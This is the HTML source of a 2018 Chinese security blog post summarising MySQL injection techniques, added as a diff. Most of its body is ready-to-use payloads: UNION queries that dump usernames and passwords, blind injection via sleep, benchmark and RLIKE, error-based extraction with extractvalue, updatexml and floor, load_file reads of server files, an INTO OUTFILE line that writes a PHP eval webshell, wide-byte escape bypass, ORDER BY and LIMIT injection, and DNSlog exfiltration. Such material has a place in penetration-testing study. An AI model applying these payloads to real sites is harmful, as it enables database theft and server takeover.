@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"phyb0x.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言基础漏洞学好研究明白才能更好的去学习审计。今天加了P神的圈子，代码审计和日战比当然是枯燥了些，希望自己能坚持下去。基础漏洞准备写个系列，稍微深入研究下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入小结">
+<meta property="og:url" content="https://phyb0x.github.io/2018/12/11/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/index.html">
+<meta property="og:site_name" content="p&#39;Blog">
+<meta property="og:description" content="前言基础漏洞学好研究明白才能更好的去学习审计。今天加了P神的圈子，代码审计和日战比当然是枯燥了些，希望自己能坚持下去。基础漏洞准备写个系列，稍微深入研究下。">
+<meta property="og:locale">
+<meta property="og:image" content="https://i.imgur.com/kR3FI3x.png">
+<meta property="og:image" content="https://i.imgur.com/lTBfYEN.png">
+<meta property="og:image" content="https://i.imgur.com/LYb3iii.png">
+<meta property="og:image" content="https://i.imgur.com/eQTUCBT.png">
+<meta property="og:image" content="https://i.imgur.com/Yo5m548.png">
+<meta property="og:image" content="https://i.imgur.com/o5oPYIY.png">
+<meta property="og:image" content="https://i.imgur.com/TsAXIGM.png">
+<meta property="og:image" content="https://i.imgur.com/tKP7Ktj.png">
+<meta property="article:published_time" content="2018-12-11T04:24:08.000Z">
+<meta property="article:modified_time" content="2019-01-19T02:05:22.000Z">
+<meta property="article:author" content="Yumi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/kR3FI3x.png">
+
+<link rel="canonical" href="https://phyb0x.github.io/2018/12/11/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh'
+  };
+</script>
+
+  <title>sql注入小结 | p'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">p'Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="https://phyb0x.github.io/2018/12/11/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/choumei.png">
+      <meta itemprop="name" content="Yumi">
+      <meta itemprop="description" content="Yumi">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="p'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql注入小结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-12-11 12:24:08" itemprop="dateCreated datePublished" datetime="2018-12-11T12:24:08+08:00">2018-12-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-01-19 10:05:22" itemprop="dateModified" datetime="2019-01-19T10:05:22+08:00">2019-01-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">基础漏洞总结</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>基础漏洞学好研究明白才能更好的去学习审计。今天加了P神的圈子，代码审计和日战比当然是枯燥了些，希望自己能坚持下去。基础漏洞准备写个系<br>列，稍微深入研究下。</p>
+<span id="more"></span>
+
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>总结了下觉得mysql注入主要分为如下几种方式。</p>
+<h3 id="基础注入"><a href="#基础注入" class="headerlink" title="基础注入"></a>基础注入</h3><p>最简单的注入方式，一般是查询语句中没有对参数做过滤限制，导致绕过执行我们自己的查询语句并把直接显示到页面。</p>
+<p>看网上一些文章去分析整型、字符型，当然这都无所谓。我们要思考的就是怎样执行我们的查询语句？</p>
+<p>sqlmap中有这样一个参数。</p>
+<pre><code>prefix=PREFIX 注入payload字符串前缀   --prefix=admin%1$&#39;
+</code></pre>
+<p>这参数的作用是绕过查询参数的闭合符号。</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;
+</code></pre>
+<p>以这条语句Less-1为例</p>
+<p><img src="https://i.imgur.com/kR3FI3x.png"></p>
+<p>可以看到没有报错并且执行了我们后插入的语句</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;-1&#39; union select 1,username,password from users where id=2 %23 # LIMIT 0,1&quot;
+</code></pre>
+<p>也就是说遇到这种注入我们要做的就是无论参数被什么符号闭合，找到它fuzz出它闭合它。</p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>这个类型的注入我们这有根据页面的变化来逐字猜解我们要的信息。猜解正确回显正常，反之错误。</p>
+<p>主要用到如下几种判断函数</p>
+<h5 id="left"><a href="#left" class="headerlink" title="left"></a>left</h5><pre><code>left(a,b)从左侧截取a的前b位
+</code></pre>
+<h5 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h5><pre><code>substr(a,b,c)从b位置开始，截取字符串a的c长度。结合ascii()使用
+</code></pre>
+<h5 id="MID-ORD"><a href="#MID-ORD" class="headerlink" title="MID/ORD"></a>MID/ORD</h5><pre><code>mid(a,b,c)同substr
+OPD()同ascii()
+</code></pre>
+<h5 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h5><pre><code>select user() regexp &#39;^[a-z]&#39;;
+</code></pre>
+<p><img src="https://i.imgur.com/lTBfYEN.png"></p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>根据页面返回时间长短判断猜解是否正确。结合<code>if(condition,true,flase) / and 1=*</code>判断语句使用。</p>
+<p>主要用到如下几种函数</p>
+<h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h5><pre><code>sleep(N)  可以让语句运行N秒
+</code></pre>
+<h5 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark"></a>benchmark</h5><pre><code>benchmark() 可以测试某些特定操作的执行速度。参数可以是需要执行的次数和表达式。 
+
+mysql&gt; select benchmark(10000000,MD5(&quot;hello word&quot;));
++---------------------------------------+
+| benchmark(10000000,SHA1(&quot;hello word&quot;)) |
++---------------------------------------+
+| 0 |
++---------------------------------------+
+1 row in set (4.93 sec)
+</code></pre>
+<h5 id="get-lock"><a href="#get-lock" class="headerlink" title="get_lock"></a>get_lock</h5><pre><code>get_lock(key,timeout) 一个是key，就是根据这个参数进行加锁的，另一个是等待时间(s)。
+如果key是第一次加锁返回1，反之等待时间进行第二次加锁。
+
+利用条件比较苛刻，需要使用 mysql_pconnect函数来连接数据库
+</code></pre>
+<p>要两个session分别进行</p>
+<p><img src="https://i.imgur.com/LYb3iii.png"></p>
+<h5 id="RLIKE"><a href="#RLIKE" class="headerlink" title="RLIKE"></a>RLIKE</h5><p>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p>
+<pre><code>rpad(str1,length,str2) str1没有length长用str2填充
+repeat(str,count) 返回str重复count次之后的str
+  
+mysql&gt; select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);
++-------------------------------------------------------------+
+| rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;) |
++-------------------------------------------------------------+
+|   0 |
++-------------------------------------------------------------+
+1 row in set (5.27 sec)
+</code></pre>
+<h5 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h5><p>概念自行百度吧，我现代60飘过。</p>
+<p>本地测试两个表还可以，三个直接爆炸。(等不出来了估计是小时级的)</p>
+<p><img src="https://i.imgur.com/eQTUCBT.png"></p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>报错注入也是一种盲注，利用MYSQL函数特性返回信息，法师的代码审计后面有写到一共十个函数。</p>
+<h5 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h5><pre><code>floor() 去除小数部分
+rand() 产生随机数，如果限定种子rand(x)则随机数是固定的 
+</code></pre>
+<p>利用group by 和floor抛出主键冗余报错返回我们想要的信息。</p>
+<pre><code>select count(*),concat(floor(rand(0)*2),(payload)) as x from information_schema.tables group by x;
+</code></pre>
+<h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h5><pre><code>extractvalue(xml文档，xml路径) 对xml文档进行查询 查询的字符串最大长度32位，超出要结合substr
+</code></pre>
+<p>这个函数只要语法不错就不会报错会返回空。xml路径是/xx/x/ 这样的形式，我们只要写入非法格式就会报错。</p>
+<pre><code>select username from security.user where id=1 and (extractvalue(&#39;anything&#39;,concat(&#39;~&#39;,(payload))))
+</code></pre>
+<h5 id="updatexml-同32位"><a href="#updatexml-同32位" class="headerlink" title="updatexml(同32位)"></a>updatexml(同32位)</h5><pre><code>updatexml(目标xml文档,xml路径,更新的内容) 更新xml文档的函数  原理用法同上给错误路径格式报错
+</code></pre>
+<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><pre><code>exp()当传入的数值大于709时就会引起溢出错误(适用大于MySQL5.5.5)
+
+select exp(~(select*from(payload)x))
+</code></pre>
+<h5 id="NAME-CONST"><a href="#NAME-CONST" class="headerlink" title="NAME_CONST"></a>NAME_CONST</h5><pre><code> and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)
+</code></pre>
+<p>利用mysql列明重复会报错，适用低版本(貌似只能测试内置函数,我尝试写入payload报错网上也没有找到相应的实例)</p>
+<h5 id="join"><a href="#join" class="headerlink" title="join"></a>join</h5><p>在已知表明的情况下适用</p>
+<pre><code>select * from (select * from 表名 a join 表名 b) c)  
+在得到一个字段后，使用using得到下一个字段
+select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段)) c  
+</code></pre>
+<h5 id="几何函数"><a href="#几何函数" class="headerlink" title="几何函数"></a>几何函数</h5><pre><code>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()
+</code></pre>
+<p>这些用法类似归结到一类，适用大于Mysql5.5.47，不包括5.7.17</p>
+<pre><code>select linestring((select * from(select * from(payload)a)b));
+</code></pre>
+<h3 id="文件操作及增删改"><a href="#文件操作及增删改" class="headerlink" title="文件操作及增删改"></a>文件操作及增删改</h3><h4 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h4><p>使用条件</p>
+<pre><code>1、有读写权限  and(select count(*) from mysql.user)&gt;0/* 返回正常说明有读写权限
+2、知道绝对路径
+3、读取文件在服务器上
+4、读取文件要小于 max_allowed_packet
+</code></pre>
+<p>示例</p>
+<pre><code>1、select 1,2,3,hex(replace(load_file(char(ascii编码的payload))))
+
+2、select 1,2,3,load_file(char(ascii编码的payload))
+
+3、select 1,2,3,load_file(hexpayload)
+
+4、select 1,2,3,load_file(c:\\boot.ini)
+</code></pre>
+<h4 id="load-data-infile"><a href="#load-data-infile" class="headerlink" title="load data infile"></a>load data infile</h4><p>将文本中的数据写入到表中。</p>
+<h4 id="outfile-文件导出"><a href="#outfile-文件导出" class="headerlink" title="outfile 文件导出"></a>outfile 文件导出</h4><pre><code>Select &lt;?php @eval($_post[“mima”])?&gt; into outfile “c:\\phpnow\\htdocs\\test.php” 
+</code></pre>
+<p>sql写马用的及时这种方式，要有读写权限。也可以结合load_file()使用。<br>    select load_ file(‘c:\wamp\bin\mysql\mysql5.6.17\my.ini’)into outfile‘c:\wamp\www\test.php</p>
+<h3 id="常见注入"><a href="#常见注入" class="headerlink" title="常见注入"></a>常见注入</h3><h4 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h4><p>mysql使用GBK编码时认定两个字为一个汉字，在一些安全函数是这样(&#39;)转义单引号，我们可以%df%5c%27这样转义过来就变成<code>運&#39;</code>单引号逃逸。<br>再说一下这个一定要</p>
+<pre><code>mysql_real_escape_string
+mysql_set_charset 
+</code></pre>
+<p>一起使用，要不然还是会造成注入。</p>
+<h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><p><code>order by</code>排序函数，经常被使用在猜解列名。order by注入不是利用这个函数去注入而是指注入点在order by后面。</p>
+<pre><code>$sql = &quot;select * from users order by $sort&quot;
+</code></pre>
+<p>利用方式：</p>
+<p>1、参数后直接跟注入语句 ?sort=(payload)</p>
+<p><img src="https://i.imgur.com/Yo5m548.png"></p>
+<p>2、?sort=1 and (payload)</p>
+<p><img src="https://i.imgur.com/o5oPYIY.png"></p>
+<p>3、利用布尔类型进行判断 不限于rand(true/false) 也可以利用if()等判断函数。</p>
+<pre><code>/?sort=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x67,1,0x00))
+</code></pre>
+<h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>limit注入其实和order by 分不开。看p牛博客<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a></p>
+<pre><code>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT injection_point
+</code></pre>
+<p>limit后面可以跟两个函数<code>PROCEDURE 和 INTO</code>，INTO要有写入权限，可以用报错和时间盲注直接上payload</p>
+<p>报错注入</p>
+<pre><code>SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 
+</code></pre>
+<p>时间盲注(sleep不行)</p>
+<pre><code>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
+</code></pre>
+<h4 id="无逗号注入"><a href="#无逗号注入" class="headerlink" title="无逗号注入"></a>无逗号注入</h4><p>忘了是在哪到ctf题目里面get到的，以为不重要，但是某位老哥面试的时候被问到了。还是记录下，直接上payload。</p>
+<pre><code>&#39; union select * from (payload) a join (select version() ) b %23
+</code></pre>
+<h4 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h4><p>将select查询到的数据与一个域名拼接成一个新的子域名，然后请求解析这个子域名，利用dns解析产生的记录日志来查看数据。</p>
+<h5 id="Ceye"><a href="#Ceye" class="headerlink" title="Ceye"></a>Ceye</h5><p>CEYE<a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a>是一个检测带外流量的监控平台，如DNS查询和HTTP请求。注册之后会分配一个二级域名<code>：xxx.ceye.io</code>，我们把注入信息放到三级域名。</p>
+<p>因为要用load_file()解析DNS请求，所以mysql <code>secure_file_priv</code>的值不能为NULL。这个配置在phpmyadmin日志文件getshell里也有用到。</p>
+<p><img src="https://i.imgur.com/TsAXIGM.png"></p>
+<p><img src="https://i.imgur.com/tKP7Ktj.png"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>sql基础基本就这样了，主要是要灵活利用。总结了一些报错盲注函数，遇到waf的时候可以都试试，后续尝试写一些bypass的，可能是只研究sqlbypass，也可能等基础漏洞写完之后一起研究下。(估计很有难度)</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/175049.html">https://www.freebuf.com/articles/web/175049.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cdxy.me/?p=789">https://www.cdxy.me/?p=789</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/253">https://xz.aliyun.com/t/253</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/afanti/p/8047530.html">https://www.cnblogs.com/afanti/p/8047530.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/12/06/php%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/" rel="prev" title="php审计笔记">
+      <i class="fa fa-chevron-left"></i> php审计笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/12/21/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="next" title="win权限维持">
+      win权限维持 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">基础注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.1.</span> <span class="nav-text">布尔盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#left"><span class="nav-number">4.1.1.</span> <span class="nav-text">left</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#substr"><span class="nav-number">4.1.2.</span> <span class="nav-text">substr</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MID-ORD"><span class="nav-number">4.1.3.</span> <span class="nav-text">MID&#x2F;ORD</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#regexp"><span class="nav-number">4.1.4.</span> <span class="nav-text">regexp</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.2.</span> <span class="nav-text">时间盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#sleep"><span class="nav-number">4.2.1.</span> <span class="nav-text">sleep</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#benchmark"><span class="nav-number">4.2.2.</span> <span class="nav-text">benchmark</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#get-lock"><span class="nav-number">4.2.3.</span> <span class="nav-text">get_lock</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#RLIKE"><span class="nav-number">4.2.4.</span> <span class="nav-text">RLIKE</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF"><span class="nav-number">4.2.5.</span> <span class="nav-text">笛卡尔积</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">4.3.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#floor"><span class="nav-number">4.3.1.</span> <span class="nav-text">floor</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#extractvalue"><span class="nav-number">4.3.2.</span> <span class="nav-text">extractvalue</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#updatexml-%E5%90%8C32%E4%BD%8D"><span class="nav-number">4.3.3.</span> <span class="nav-text">updatexml(同32位)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#EXP"><span class="nav-number">4.3.4.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#NAME-CONST"><span class="nav-number">4.3.5.</span> <span class="nav-text">NAME_CONST</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#join"><span class="nav-number">4.3.6.</span> <span class="nav-text">join</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%87%A0%E4%BD%95%E5%87%BD%E6%95%B0"><span class="nav-number">4.3.7.</span> <span class="nav-text">几何函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%8F%8A%E5%A2%9E%E5%88%A0%E6%94%B9"><span class="nav-number">5.</span> <span class="nav-text">文件操作及增删改</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#load-file-%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6"><span class="nav-number">5.1.</span> <span class="nav-text">load_file()导出文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#load-data-infile"><span class="nav-number">5.2.</span> <span class="nav-text">load data infile</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#outfile-%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BA"><span class="nav-number">5.3.</span> <span class="nav-text">outfile 文件导出</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5"><span class="nav-number">6.</span> <span class="nav-text">常见注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82"><span class="nav-number">6.1.</span> <span class="nav-text">宽字节</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#order-by"><span class="nav-number">6.2.</span> <span class="nav-text">order by</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#limit"><span class="nav-number">6.3.</span> <span class="nav-text">limit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%A0%E9%80%97%E5%8F%B7%E6%B3%A8%E5%85%A5"><span class="nav-number">6.4.</span> <span class="nav-text">无逗号注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNSlog%E6%B3%A8%E5%85%A5"><span class="nav-number">6.5.</span> <span class="nav-text">DNSlog注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Ceye"><span class="nav-number">6.5.1.</span> <span class="nav-text">Ceye</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">8.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Yumi"
+      src="/images/choumei.png">
+  <p class="site-author-name" itemprop="name">Yumi</p>
+  <div class="site-description" itemprop="description">Yumi</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
